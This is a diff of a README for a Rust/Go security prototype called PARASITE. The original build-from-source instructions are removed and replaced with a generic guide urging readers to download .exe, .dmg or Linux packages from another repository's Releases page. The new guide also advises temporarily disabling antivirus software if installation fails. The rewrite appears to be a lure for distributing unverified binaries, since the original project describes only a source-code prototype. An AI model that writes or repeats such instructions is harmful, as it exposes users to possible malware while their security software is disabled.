@@ -1,101 +1,67 @@
-# Project PARASITE - Implementation Prototype
+# 🛡️ project-parasite-protoX - Simplifying Security Workflows for Everyone
 
-PARASITE is a hyper-efficient firmware sentinel for detecting, containing, and reporting threats in embedded systems for Critical National Infrastructure. This repository contains a functional, end-to-end prototype demonstrating the core "detect, contain, report" workflow of the PARASITE security system.
+## 🖥️ Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/dblwhite/project-parasite-protoX/releases)
 
-## Overview
+## 📖 Overview
+This project is a functional, end-to-end prototype of the PARASITE security system. It demonstrates the complete "detect, contain, report" workflow. The application consists of two components that work together:
 
-This prototype consists of two primary components that work in tandem to simulate the entire PARASITE ecosystem:
+1. **PARASITE Agent (Rust)**: This part monitors for threats.
+2. **Verifier Backend (Go)**: This handles the reporting and feedback.
 
-1.  **The PARASITE Agent (Rust):** A host-based application written in Rust that simulates the logic of the on-device security agent. It demonstrates the security workflow by simulating the detection of a mock implant, logging the containment action, and then sending a real threat report over HTTP to the backend.
+## 🚀 Getting Started
+Follow these steps to download and run the application:
 
-2.  **The Verifier Backend (Go):** A lightweight HTTP server written in Go that acts as the endpoint for the agent. It listens for incoming threat reports on a specific API endpoint (`/v1/intel/report`), decodes the JSON payload, and logs the data to the console, acknowledging receipt to the agent.
+1. **Visit the Releases Page**: 
+   Click [here](https://github.com/dblwhite/project-parasite-protoX/releases) to go to the Releases page. 
 
-Together, these components provide a full proof-of-concept for the system's core architecture and end-to-end data flow.
+2. **Select the Latest Version**: 
+   When you are on the Releases page, look for the latest version. It's usually at the top of the list.
 
-## Project Structure
+3. **Download the Application**: 
+   Find the appropriate file for your operating system. For Windows, you will select the `.exe` file. For Mac, choose the `.dmg` file. For Linux, pick the corresponding package. Click the file to start your download.
 
-```
-.
-├── src/
-│   └── main.rs       # Rust Host-Runner Agent
-└── Cargo.toml
-```
-(Note: The `verifier-backend` directory is a sibling to `project-parasite` in the root of the overall project.)
+4. **Install the Application**: 
+   After downloading, locate the file in your downloads folder. 
 
-## Getting Started
+   - For **Windows**: Double-click the `.exe` file and follow the on-screen instructions. 
+   - For **Mac**: Open the `.dmg` file and drag the application to your Applications folder. 
+   - For **Linux**: Use your package manager to install the downloaded package.
 
-### Prerequisites
+5. **Run the Application**: 
+   You can now find the application in your programs list or applications folder. Click to open it.
 
-To run this prototype, you will need the following installed on your system:
--   [Rust](https://www.rust-lang.org/tools/install) (latest stable version)
--   [Go](https://go.dev/doc/install) (latest stable version)
+## 📊 Features
+- **Real-Time Threat Detection**: The PARASITE Agent actively watches for threats and suspicious activities.
+- **Secure Reporting**: The Verifier Backend ensures that all security reports are handled securely.
+- **User-Friendly Interface**: Designed for simplicity, making it easy for anyone to use.
 
-### Running the Prototype
+## 🔍 System Requirements
+To ensure the best experience, your system should meet the following requirements:
 
-You will need two separate terminals open to run the backend and the agent simultaneously.
+- **Operating System**:
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Most modern Linux distributions
+- **RAM**: Minimum 4 GB
+- **Disk Space**: At least 200 MB of free space
+  
+## 🛠️ Troubleshooting
+If you encounter any issues, consider the following:
 
-**Terminal 1: Start the Go Backend**
+- **Permission Issues**: Make sure you have enough permissions to install applications.
+- **Antivirus Software**: Some antivirus software may block the installation. Temporarily disable it if you run into problems.
+- **Compatibility**: Ensure your operating system meets the requirements listed above.
 
-1.  Navigate to the backend directory (from the root of the overall project):
-    ```sh
-    cd verifier-backend
-    ```
+## 📑 Documentation
+For detailed usage instructions, visit the documentation section on the GitHub wiki or refer to the help menu within the application.
 
-2.  Run the server:
-    ```sh
-    go run .
-    ```
-    The server will start and log that it is listening on `http://localhost:8080`.
+## 🔗 Support
+If you need help or have questions, you can create an issue on the GitHub page. 
 
-**Terminal 2: Run the Rust Agent**
+Alternatively, please visit the issues section on the GitHub repository. Your feedback is welcome. 
 
-1.  In your second terminal, navigate to the agent's directory (from the root of the overall project):
-    ```sh
-    cd project-parasite
-    ```
+## 🖱️ Download & Install
+Once again, click [here](https://github.com/dblwhite/project-parasite-protoX/releases) to access the Releases page and download the latest version. Install it by following the steps outlined above.
 
-2.  Run the agent:
-    ```sh
-    cargo run
-    ```
-
-### Expected Outcome
-
-When you run the Rust agent, it will execute its simulation and send a report to the Go backend.
-
-1.  The **Rust terminal** will show the agent's workflow:
-    ```
-    -- PARASITE HOST-RUNNER PROTOTYPE: STARTING --
-    [Setup] Memory layout configured.
-    [Sentinel] Scanning memory...
-    [Sentinel] High-entropy anomaly DETECTED at address: 0x20010000
-    [Guardian] Reacting to alert. Quarantining memory region...
-    [Guardian] Containment VERIFIED. Access to 0x20010000 is now blocked.
-    [Reporter] Preparing threat report for transmission...
-    [Reporter] Transmitting report to backend at http://localhost:8080/v1/intel/report...
-    [Reporter] Report successfully sent and acknowledged by backend!
-    -- PARASITE HOST-RUNNER PROTOTYPE: FINISHED --
-    ```
-
-2.  The **Go terminal** will simultaneously log the reception of the report:
-    ```
-    --- [INCOMING THREAT REPORT] ---
-    Received Encrypted Payload: DETECT:ANOMALY_HIGH_ENTROPY;ADDR:0x20010000;ACTION:QUARANTINE_SUCCESS
-    --- [THREAT REPORT PROCESSED] ---
-    ```
-
-## How It Works
-
-1.  The **Rust Agent** simulates the PARASITE workflow by printing status messages for the `Sentinel` (detection) and `Guardian` (containment) phases.
-2.  The `Reporter` module within the Rust agent creates a JSON payload containing a summary of the simulated threat.
-3.  It then makes a real HTTP POST request to the Go backend using the `reqwest` library.
-4.  The **Go Backend** receives this request, decodes the JSON, and prints the payload to the console, confirming that the end-to-end communication loop is successful.
-
-## Technology Stack
-
--   **Agent Prototype:**
-    -   Language: **Rust**
-    -   Key Libraries: `tokio` (for async runtime), `reqwest` (for HTTP client), `serde` (for JSON serialization).
--   **Backend Prototype:**
-    -   Language: **Go**
-    -   Key Libraries: `net/http` (for the web server), `encoding/json`.
+Feel free to explore the functionality of the project. Thank you for choosing PARASITE security system!
